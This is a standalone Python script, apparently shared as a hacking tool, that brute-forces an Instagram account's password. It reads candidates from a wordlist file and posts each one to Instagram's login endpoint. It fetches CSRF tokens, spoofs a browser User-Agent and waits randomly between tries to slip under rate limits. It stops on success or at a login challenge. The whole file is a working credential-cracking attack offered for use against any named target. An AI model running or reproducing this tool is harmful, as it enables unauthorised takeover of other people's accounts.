import requests
import time
import random

# Banner
print("""
    *************************************
    *        It Is Unique Official      *
    *************************************
""")

# Instagram login URL
url = "https://www.instagram.com/accounts/login/ajax/"

# Headers with realistic User-Agent
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Referer": "https://www.instagram.com/accounts/login/",
    "X-Requested-With": "XMLHttpRequest"
}

# Username and password list
username = "target_username"  # Replace with actual Instagram username
passwords = open("pass.txt").read().splitlines()

# Loop through the password list
for password in passwords:
    session = requests.Session()

    # Initial GET request to fetch cookies and CSRF token
    response = session.get('https://www.instagram.com/accounts/login/')
    
    if 'csrftoken' in session.cookies:
        csrf_token = session.cookies['csrftoken']
    else:
        print("Failed to retrieve CSRF token.")
        continue

    # Update headers with the CSRF token
    headers['X-CSRFToken'] = csrf_token

    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",  # Password format
        "queryParams": "{}",
        "optIntoOneTap": False
    }

    # Send POST request to attempt login
    response = session.post(url, data=payload, headers=headers)

    # Handle the response
    if response.status_code == 200:
        json_response = response.json()

        # Check for authentication
        if json_response.get("authenticated"):
            print(f"Success: {password} is the correct password.")
            print("Stopping further attempts.")
            session.close()  # Close session to clean up resources
            break  # Stop the loop and terminate script

        # Handle login challenge or 2FA
        elif "checkpoint_url" in json_response:
            print(f"Login challenge required for {username}.")
            print("Stopping further attempts.")
            break  # Stop as Instagram requires additional steps for this account

        # Failed login
        else:
            print(f"Failed: {password} is incorrect.")
    
    # Handle rate-limiting or errors
    else:
        print(f"Error: Received unexpected status code {response.status_code}.")

    # Add a delay to avoid Instagram rate-limiting
    delay = random.randint(30, 60)  # Increase delay to prevent blocking
    print(f"Waiting for {delay} seconds to avoid rate limiting.")
    time.sleep(delay)  # Increase delay between attempts

# Final message after loop completion or success
print("Password cracking attempt finished.")
